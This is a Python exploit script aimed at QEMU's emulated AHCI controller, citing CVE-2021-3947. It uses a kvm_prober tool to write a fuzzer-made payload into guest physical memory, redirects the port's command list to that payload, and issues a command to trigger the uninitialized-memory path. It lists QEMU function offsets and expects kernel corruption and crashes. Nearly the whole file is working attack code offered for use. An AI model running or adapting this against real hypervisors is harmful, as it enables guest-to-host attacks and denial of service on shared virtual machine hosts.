#!/usr/bin/env python3
"""
AHCI Fuzzer Payload Exploitation
Uses a binary fuzzing input that triggers AHCI error handling code
This targets the uninitialized memory path in error recovery
"""

import struct
import os
import sys
import time
import subprocess
import base64
from pathlib import Path
from typing import Optional, List

def log_info(msg): 
    print(f"[\033[94m*\033[0m] {msg}")

def log_success(msg): 
    print(f"[\033[92m+\033[0m] {msg}")

def log_error(msg): 
    print(f"[\033[91m-\033[0m] {msg}")

def log_warning(msg): 
    print(f"[\033[93m!\033[0m] {msg}")

def log_debug(msg, debug=False):
    if debug:
        print(f"[\033[96mD\033[0m] {msg}")

# ============================================================================
# QEMU OFFSETS AND FUNCTION POINTERS
# ============================================================================

QEMU_OFFSETS = {
    'bg_timercb': 0x475ed0,
    'cache_clean_timer_cb': 0x1153e10,
    'cursor_timer_cb': 0x343160,
    'execute_ncq_command': 0x523220,
    'cpu_exec': 0xf163d0,
}

# ============================================================================
# KVM_PROBER MEMORY ACCESS
# ============================================================================

class KVMProberMemory:
    """Physical memory access via kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = kvm_prober_path
        self.is_available = self.check_kvm_prober()
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug

    def check_kvm_prober(self) -> bool:
        """Check if kvm_prober exists and works"""
        if not os.path.exists(self.kvm_prober):
            log_error(f"kvm_prober not found at {self.kvm_prober}")
            return False

        try:
            result = subprocess.run([self.kvm_prober, 'read_phys', '0x1000', '16'],
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and 'Driver initialized' in result.stdout:
                log_success("kvm_prober is working!")
                return True
        except Exception as e:
            log_error(f"kvm_prober test failed: {e}")
        
        return False

    def read(self, phys_addr: int, size: int) -> Optional[bytes]:
        """Read physical memory"""
        if not self.is_available:
            return None

        try:
            cmd = [self.kvm_prober, 'read_phys', f'0x{phys_addr:x}', str(size)]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)

            if result.returncode != 0:
                return None

            return self.parse_kvm_prober_output(result.stdout)

        except Exception as e:
            return None

    def parse_kvm_prober_output(self, output: str) -> Optional[bytes]:
        """Parse kvm_prober hex dump output"""
        lines = output.strip().split('\n')
        data_bytes = bytearray()

        for line in lines:
            if 'Driver initialized' in line or not line.strip():
                continue
            
            if ':' in line:
                hex_part = line.split(':', 1)[1].strip()
                if '|' in hex_part:
                    hex_part = hex_part.split('|')[0].strip()
                
                for hex_byte in hex_part.split():
                    if hex_byte and len(hex_byte) == 2:
                        try:
                            data_bytes.append(int(hex_byte, 16))
                        except ValueError:
                            continue

        return bytes(data_bytes) if data_bytes else None

    def write(self, phys_addr: int, data: bytes) -> bool:
        """Write physical memory"""
        if not self.is_available:
            return False

        try:
            hex_data = data.hex()
            
            if len(hex_data) % 2 != 0:
                hex_data = '0' + hex_data
            
            cmd = [self.kvm_prober, 'write_phys', f'0x{phys_addr:x}', hex_data]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)

            if result.returncode != 0:
                return False
            
            return 'Wrote' in result.stdout or 'success' in result.stdout.lower()

        except Exception as e:
            return False

    def test_write_read(self, phys_addr: int) -> bool:
        """Test write/read"""
        test_data = b'\x41\x42\x43\x44\x45\x46\x47\x48'
        
        if not self.write(phys_addr, test_data):
            return False
        
        time.sleep(0.1)
        
        read_back = self.read(phys_addr, 8)
        return read_back == test_data

# ============================================================================
# AHCI DEVICE INTERFACE
# ============================================================================

class AHCIDevice:
    """AHCI device interface"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.pci_addr = None
        self.mmio_base = None
        self.mmio_size = 0x10000
        self.phys_mem = KVMProberMemory(kvm_prober_path)

    def find_device(self) -> bool:
        """Auto-detect QEMU AHCI device"""
        log_info("Searching for QEMU AHCI device...")

        try:
            for dev in Path("/sys/bus/pci/devices").iterdir():
                vendor_file = dev / "vendor"
                if vendor_file.exists():
                    class_file = dev / "class"
                    if class_file.exists():
                        dev_class = class_file.read_text().strip()
                        if dev_class.startswith("0x0106"):
                            self.pci_addr = dev.name
                            log_success(f"Found AHCI at {self.pci_addr}")
                            return True
        except Exception as e:
            log_error(f"Error searching for AHCI: {e}")

        return False

    def get_mmio_address(self) -> Optional[int]:
        """Get MMIO base from PCI config"""
        if not self.pci_addr:
            return None

        resource_file = Path(f"/sys/bus/pci/devices/{self.pci_addr}/resource")

        if not resource_file.exists():
            return None

        try:
            resources = resource_file.read_text().strip().split('\n')
            for i, line in enumerate(resources):
                parts = line.split()
                if len(parts) >= 3:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)

                    if i == 5 and start != 0 and end > start:
                        self.mmio_base = start
                        self.mmio_size = end - start + 1
                        log_success(f"AHCI MMIO: 0x{start:x} (size: 0x{self.mmio_size:x})")
                        return start
        except Exception as e:
            log_error(f"Failed to get MMIO address: {e}")

        return None

    def map_mmio(self) -> bool:
        """Verify MMIO access"""
        if not self.mmio_base:
            if not self.get_mmio_address():
                return False

        if not self.phys_mem.is_available:
            return False

        log_info(f"Testing MMIO access at 0x{self.mmio_base:x}...")
        test_data = self.phys_mem.read(self.mmio_base, 16)

        if test_data:
            log_success(f"MMIO accessible")
            return True
        
        return False

    def read_reg(self, offset: int) -> int:
        """Read MMIO register"""
        if not self.mmio_base:
            return 0

        addr = self.mmio_base + offset
        data = self.phys_mem.read(addr, 4)

        if data and len(data) == 4:
            return struct.unpack('<I', data)[0]
        return 0

    def write_reg(self, offset: int, value: int):
        """Write MMIO register"""
        if not self.mmio_base:
            return

        addr = self.mmio_base + offset
        self.phys_mem.write(addr, struct.pack('<I', value))

    def reset_port(self, port=0):
        """Reset AHCI port"""
        port_base = 0x100 + (port * 0x80)
        cmd_reg = self.read_reg(port_base + 0x18)

        self.write_reg(port_base + 0x18, cmd_reg & ~0x1)
        time.sleep(0.01)

        self.write_reg(port_base + 0x10, 0xFFFFFFFF)

# ============================================================================
# FUZZER PAYLOAD EXPLOIT
# ============================================================================

class AHCIFuzzerExploit:
    """Exploitation using fuzzer-generated binary payload"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober", 
                 fuzzer_bin_path=None):
        self.ahci = AHCIDevice(kvm_prober_path)
        self.phys_mem = KVMProberMemory(kvm_prober_path)
        self.fuzzer_payload = None
        self.fuzzer_bin_path = fuzzer_bin_path
        self.debug = False

        log_info(f"Using kvm_prober at: {kvm_prober_path}")

    def set_debug(self, debug: bool):
        self.debug = debug
        self.ahci.phys_mem.set_debug(debug)

    def load_fuzzer_payload(self) -> bool:
        """Load fuzzer binary payload"""
        if not self.fuzzer_bin_path:
            log_error("No fuzzer payload path specified")
            return False

        if not os.path.exists(self.fuzzer_bin_path):
            log_error(f"Fuzzer payload not found: {self.fuzzer_bin_path}")
            return False

        try:
            with open(self.fuzzer_bin_path, 'rb') as f:
                self.fuzzer_payload = f.read()
            
            log_success(f"Loaded fuzzer payload ({len(self.fuzzer_payload)} bytes)")
            log_info(f"Payload header: {self.fuzzer_payload[:32].hex()}")
            
            # Analyze pattern
            self.analyze_payload()
            return True
        except Exception as e:
            log_error(f"Failed to load payload: {e}")
            return False

    def analyze_payload(self):
        """Analyze fuzzer payload structure"""
        log_info("Analyzing fuzzer payload...")
        
        payload = self.fuzzer_payload
        
        # Look for patterns
        if b'AAAA' in payload:
            aaaa_pos = payload.find(b'AAAA')
            log_info(f"  Pattern 'AAAA' at offset 0x{aaaa_pos:x}")
        
        if b'BBBB' in payload:
            bbbb_pos = payload.find(b'BBBB')
            log_info(f"  Pattern 'BBBB' at offset 0x{bbbb_pos:x}")
        
        if b'CCCC' in payload:
            cccc_pos = payload.find(b'CCCC')
            log_info(f"  Pattern 'CCCC' at offset 0x{cccc_pos:x}")
        
        # Check structure
        log_info(f"  Total size: {len(payload)} bytes (0x{len(payload):x})")
        log_info(f"  First 16 bytes: {payload[:16].hex()}")
        log_info(f"  Last 16 bytes: {payload[-16:].hex()}")

    def setup(self) -> bool:
        """Setup exploit environment"""
        log_info("Setting up exploit environment...")

        log_info("Testing kvm_prober...")
        test_addr = 0x13e8000
        
        if not self.phys_mem.test_write_read(test_addr):
            log_error("kvm_prober test failed!")
            return False

        if not self.ahci.find_device():
            log_error("No AHCI device found")
            return False

        if not self.ahci.map_mmio():
            log_error("Failed to access AHCI MMIO")
            return False

        log_success("Setup complete")
        return True

    def write_payload_to_memory(self, addr: int) -> bool:
        """Write fuzzer payload to guest memory"""
        log_info(f"Writing fuzzer payload ({len(self.fuzzer_payload)} bytes) to 0x{addr:x}...")
        
        # Write in chunks to avoid huge commands
        chunk_size = 0x1000
        for offset in range(0, len(self.fuzzer_payload), chunk_size):
            chunk = self.fuzzer_payload[offset:offset+chunk_size]
            write_addr = addr + offset
            
            if not self.phys_mem.write(write_addr, chunk):
                log_error(f"Failed to write chunk at 0x{write_addr:x}")
                return False
            
            if (offset // chunk_size) % 10 == 0:
                log_info(f"  Written {offset + len(chunk)} bytes...")
        
        log_success(f"Payload written successfully")
        return True

    def trigger_with_payload(self) -> bool:
        """Trigger vulnerability with fuzzer payload"""
        log_info("Triggering vulnerability with fuzzer payload...")
        
        # Allocate space for payload
        payload_addr = 0x13e8000
        
        # Write payload
        if not self.write_payload_to_memory(payload_addr):
            return False
        
        time.sleep(0.5)
        
        # Reset port
        self.ahci.reset_port(0)
        time.sleep(0.1)

        PORT0_BASE = 0x100

        # Configure AHCI to read from our payload
        log_info("Configuring AHCI to process fuzzer payload...")
        
        # Set command list base address to our payload
        self.ahci.write_reg(PORT0_BASE + 0x00, payload_addr & 0xFFFFFFFF)
        self.ahci.write_reg(PORT0_BASE + 0x04, (payload_addr >> 32) & 0xFFFFFFFF)

        time.sleep(0.1)

        # Read current command register
        cmd_reg = self.ahci.read_reg(PORT0_BASE + 0x18)
        log_debug(f"Initial command register: 0x{cmd_reg:x}", self.debug)
        
        if cmd_reg == 0:
            log_error("Cannot read command register")
            return False

        # Enable command processing
        log_info("Enabling AHCI command processing...")
        self.ahci.write_reg(PORT0_BASE + 0x18, cmd_reg | 0x10)

        # Issue command - this will cause AHCI to parse our fuzzer payload
        log_info("Issuing AHCI command (malformed payload)...")
        self.ahci.write_reg(PORT0_BASE + 0x38, 0x1)

        time.sleep(0.5)

        # Check for interrupt
        is_reg = self.ahci.read_reg(PORT0_BASE + 0x10)
        log_debug(f"Interrupt status: 0x{is_reg:x}", self.debug)

        if is_reg != 0:
            self.ahci.write_reg(PORT0_BASE + 0x10, is_reg)

        log_success("Vulnerability triggered with fuzzer payload!")
        return True

    def run_exploit(self) -> bool:
        """Main exploitation flow"""
        log_info("=" * 70)
        log_info("AHCI FUZZER PAYLOAD EXPLOITATION")
        log_info("Target: QEMU AHCI Error Handling Code (CVE-2021-3947)")
        log_info("=" * 70)
        log_info("")

        if not self.load_fuzzer_payload():
            return False

        if not self.setup():
            return False

        if not self.trigger_with_payload():
            return False

        log_success("=" * 70)
        log_success("EXPLOITATION COMPLETE")
        log_success("=" * 70)
        log_info("")
        log_info("Expected outcomes:")
        log_info("  1. Malformed AHCI command triggers error handling")
        log_info("  2. Uninitialized memory is used during error recovery")
        log_info("  3. Kernel corruption occurs (check dmesg)")
        log_info("  4. Multiple subsequent crashes as corruption persists")
        log_info("")
        log_info("Check dmesg with: dmesg | tail -50")
        log_info("Look for: 'general protection fault', 'AAAA', 'BBBB', 'CCCC' patterns")
        log_info("")
        
        return True

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description='AHCI Fuzzer Payload Exploitation')
    parser.add_argument('--kvm-prober', default='/root/kvm_probin/prober/kvm_prober',
                       help='Path to kvm_prober binary')
    parser.add_argument('--payload', required=True,
                       help='Path to fuzzer binary payload')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug output')
    parser.add_argument('--analyze-only', action='store_true',
                       help='Only analyze payload, do not exploit')
    return parser.parse_args()

def main():
    args = parse_args()
    
    log_info("=" * 70)
    log_info("AHCI FUZZER PAYLOAD EXPLOIT")
    log_info("=" * 70)
    log_info("")
    
    # Check kvm_prober
    if not os.path.exists(args.kvm_prober):
        log_error(f"kvm_prober not found at {args.kvm_prober}")
        sys.exit(1)
    
    # Check payload
    if not os.path.exists(args.payload):
        log_error(f"Fuzzer payload not found at {args.payload}")
        sys.exit(1)
    
    exploit = AHCIFuzzerExploit(
        kvm_prober_path=args.kvm_prober,
        fuzzer_bin_path=args.payload
    )
    
    if args.debug:
        exploit.set_debug(True)
    
    try:
        if args.analyze_only:
            log_info("ANALYSIS MODE - Loading and analyzing payload...")
            if exploit.load_fuzzer_payload():
                log_success("Analysis complete")
            else:
                log_error("Analysis failed")
                sys.exit(1)
        else:
            log_info("EXPLOITATION MODE")
            log_info("-" * 70)
            success = exploit.run_exploit()
            sys.exit(0 if success else 1)
            
    except KeyboardInterrupt:
        log_info("\nInterrupted by user")
        sys.exit(0)
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()